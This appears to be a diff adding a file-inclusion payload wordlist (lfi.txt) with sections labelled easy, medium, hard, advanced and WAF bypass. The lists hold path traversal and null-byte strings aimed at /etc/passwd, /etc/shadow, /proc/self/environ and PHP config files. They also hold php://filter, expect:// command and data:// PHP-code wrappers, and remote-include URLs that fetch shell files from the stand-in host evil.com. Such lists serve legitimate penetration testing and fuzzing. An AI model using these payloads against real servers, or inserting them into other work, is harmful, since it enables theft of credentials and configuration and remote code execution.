@@ -1,0 +1,242 @@
+# wordlists/payloads/lfi.txt
+# ==================================================
+# LFI PAYLOADS - NIVEL EASY
+# ==================================================
+../../../../etc/passwd
+../../../../etc/passwd%00
+../../../../etc/passwd%00.jpg
+....//....//....//....//etc/passwd
+....//....//....//....//etc/passwd%00
+....//....//....//....//etc/passwd%00.jpg
+..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts
+..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts%00
+..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts%00.jpg
+C:\\Windows\\System32\\drivers\\etc\\hosts
+C:\\Windows\\System32\\drivers\\etc\\hosts%00
+C:\\Windows\\System32\\drivers\\etc\\hosts%00.jpg
+/etc/passwd
+/etc/passwd%00
+/etc/passwd%00.jpg
+/etc/shadow
+/etc/shadow%00
+/etc/shadow%00.jpg
+/etc/hosts
+/etc/hosts%00
+/etc/hosts%00.jpg
+/etc/issue
+/etc/issue%00
+/etc/issue%00.jpg
+/etc/motd
+/etc/motd%00
+/etc/motd%00.jpg
+/etc/httpd/conf/httpd.conf
+/etc/httpd/conf/httpd.conf%00
+/etc/httpd/conf/httpd.conf%00.jpg
+/etc/apache2/apache2.conf
+/etc/apache2/apache2.conf%00
+/etc/apache2/apache2.conf%00.jpg
+/proc/self/environ
+/proc/self/environ%00
+/proc/self/environ%00.jpg
+/proc/self/cmdline
+/proc/self/cmdline%00
+/proc/self/cmdline%00.jpg
+/proc/self/status
+/proc/self/status%00
+/proc/self/status%00.jpg
+/proc/self/fd/0
+/proc/self/fd/1
+/proc/self/fd/2
+/proc/self/fd/3
+/proc/self/fd/4
+/proc/self/fd/5
+
+# ==================================================
+# LFI PAYLOADS - NIVEL MEDIUM
+# ==================================================
+....//....//....//....//etc//passwd
+....//....//....//....//etc//passwd%00
+....//....//....//....//etc//passwd%00.jpg
+..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts
+..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts%00
+..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts%00.jpg
+C:\\Windows\\System32\\drivers\\etc\\hosts
+C:\\Windows\\System32\\drivers\\etc\\hosts%00
+C:\\Windows\\System32\\drivers\\etc\\hosts%00.jpg
+/var/www/html/index.php
+/var/www/html/index.php%00
+/var/www/html/index.php%00.jpg
+/var/www/html/config.php
+/var/www/html/config.php%00
+/var/www/html/config.php%00.jpg
+/var/www/html/admin.php
+/var/www/html/admin.php%00
+/var/www/html/admin.php%00.jpg
+/var/www/html/login.php
+/var/www/html/login.php%00
+/var/www/html/login.php%00.jpg
+/var/www/html/db.php
+/var/www/html/db.php%00
+/var/www/html/db.php%00.jpg
+/var/www/html/connection.php
+/var/www/html/connection.php%00
+/var/www/html/connection.php%00.jpg
+/var/www/html/settings.php
+/var/www/html/settings.php%00
+/var/www/html/settings.php%00.jpg
+/var/www/html/configuration.php
+/var/www/html/configuration.php%00
+/var/www/html/configuration.php%00.jpg
+/var/www/html/.htaccess
+/var/www/html/.htaccess%00
+/var/www/html/.htaccess%00.jpg
+/var/www/html/robots.txt
+/var/www/html/robots.txt%00
+/var/www/html/robots.txt%00.jpg
+/var/www/html/sitemap.xml
+/var/www/html/sitemap.xml%00
+/var/www/html/sitemap.xml%00.jpg
+/var/www/html/crossdomain.xml
+/var/www/html/crossdomain.xml%00
+/var/www/html/crossdomain.xml%00.jpg
+/var/www/html/clientaccesspolicy.xml
+/var/www/html/clientaccesspolicy.xml%00
+/var/www/html/clientaccesspolicy.xml%00.jpg
+
+# ==================================================
+# LFI PAYLOADS - NIVEL HARD (WRAPPERS PHP)
+# ==================================================
+php://filter/convert.base64-encode/resource=index.php
+php://filter/convert.base64-encode/resource=config.php
+php://filter/convert.base64-encode/resource=admin.php
+php://filter/convert.base64-encode/resource=login.php
+php://filter/convert.base64-encode/resource=db.php
+php://filter/convert.base64-encode/resource=connection.php
+php://filter/convert.base64-encode/resource=settings.php
+php://filter/convert.base64-encode/resource=configuration.php
+php://filter/convert.base64-encode/resource=../../../../etc/passwd
+php://filter/convert.base64-encode/resource=../../../../etc/shadow
+php://filter/convert.base64-encode/resource=../../../../etc/hosts
+php://filter/convert.base64-encode/resource=../../../../etc/issue
+php://filter/convert.base64-encode/resource=../../../../etc/motd
+php://filter/convert.base64-encode/resource=../../../../etc/httpd/conf/httpd.conf
+php://filter/convert.base64-encode/resource=../../../../etc/apache2/apache2.conf
+php://filter/read=convert.base64-encode/resource=index.php
+php://filter/read=convert.base64-encode/resource=config.php
+php://filter/read=convert.base64-encode/resource=admin.php
+php://filter/read=convert.base64-encode/resource=login.php
+php://filter/read=convert.base64-encode/resource=db.php
+php://filter/read=convert.base64-encode/resource=connection.php
+php://filter/read=convert.base64-encode/resource=settings.php
+php://filter/read=convert.base64-encode/resource=configuration.php
+php://filter/read=convert.base64-encode/resource=../../../../etc/passwd
+php://filter/read=convert.base64-encode/resource=../../../../etc/shadow
+php://filter/read=convert.base64-encode/resource=../../../../etc/hosts
+php://filter/read=convert.base64-encode/resource=../../../../etc/issue
+php://filter/read=convert.base64-encode/resource=../../../../etc/motd
+php://filter/read=convert.base64-encode/resource=../../../../etc/httpd/conf/httpd.conf
+php://filter/read=convert.base64-encode/resource=../../../../etc/apache2/apache2.conf
+expect://id
+expect://whoami
+expect://uname -a
+expect://cat /etc/passwd
+expect://cat /etc/shadow
+expect://cat /etc/hosts
+expect://cat /etc/issue
+expect://cat /etc/motd
+data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
+data://text/plain,<?php phpinfo(); ?>
+input:///etc/passwd
+input:///etc/shadow
+input:///etc/hosts
+input:///etc/issue
+input:///etc/motd
+
+# ==================================================
+# LFI PAYLOADS - NIVEL ADVANCED (RFI)
+# ==================================================
+http://evil.com/shell.txt
+http://evil.com/shell.php
+http://evil.com/shell.jpg
+http://evil.com/shell.png
+http://evil.com/shell.gif
+http://evil.com/shell.pdf
+http://evil.com/shell.doc
+http://evil.com/shell.xls
+http://evil.com/shell.ppt
+\\\\evil.com\\share\\shell.txt
+\\\\evil.com\\share\\shell.php
+\\\\evil.com\\share\\shell.jpg
+\\\\evil.com\\share\\shell.png
+\\\\evil.com\\share\\shell.gif
+\\\\evil.com\\share\\shell.pdf
+\\\\evil.com\\share\\shell.doc
+\\\\evil.com\\share\\shell.xls
+\\\\evil.com\\share\\shell.ppt
+ftp://evil.com/shell.txt
+ftp://evil.com/shell.php
+ftp://evil.com/shell.jpg
+ftp://evil.com/shell.png
+ftp://evil.com/shell.gif
+ftp://evil.com/shell.pdf
+ftp://evil.com/shell.doc
+ftp://evil.com/shell.xls
+ftp://evil.com/shell.ppt
+https://evil.com/shell.txt
+https://evil.com/shell.php
+https://evil.com/shell.jpg
+https://evil.com/shell.png
+https://evil.com/shell.gif
+https://evil.com/shell.pdf
+https://evil.com/shell.doc
+https://evil.com/shell.xls
+https://evil.com/shell.ppt
+
+# ==================================================
+# LFI PAYLOADS - BYPASS WAF
+# ==================================================
+....//....//....//....//etc/passwd
+....//....//....//....//etc/passwd%00
+....//....//....//....//etc/passwd%00.jpg
+..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts
+..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts%00
+..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts%00.jpg
+C:\\Windows\\System32\\drivers\\etc\\hosts
+C:\\Windows\\System32\\drivers\\etc\\hosts%00
+C:\\Windows\\System32\\drivers\\etc\\hosts%00.jpg
+/etc/passwd
+/etc/passwd%00
+/etc/passwd%00.jpg
+/etc/shadow
+/etc/shadow%00
+/etc/shadow%00.jpg
+/etc/hosts
+/etc/hosts%00
+/etc/hosts%00.jpg
+/etc/issue
+/etc/issue%00
+/etc/issue%00.jpg
+/etc/motd
+/etc/motd%00
+/etc/motd%00.jpg
+/etc/httpd/conf/httpd.conf
+/etc/httpd/conf/httpd.conf%00
+/etc/httpd/conf/httpd.conf%00.jpg
+/etc/apache2/apache2.conf
+/etc/apache2/apache2.conf%00
+/etc/apache2/apache2.conf%00.jpg
+/proc/self/environ
+/proc/self/environ%00
+/proc/self/environ%00.jpg
+/proc/self/cmdline
+/proc/self/cmdline%00
+/proc/self/cmdline%00.jpg
+/proc/self/status
+/proc/self/status%00
+/proc/self/status%00.jpg
+/proc/self/fd/0
+/proc/self/fd/1
+/proc/self/fd/2
+/proc/self/fd/3
+/proc/self/fd/4
+/proc/self/fd/5
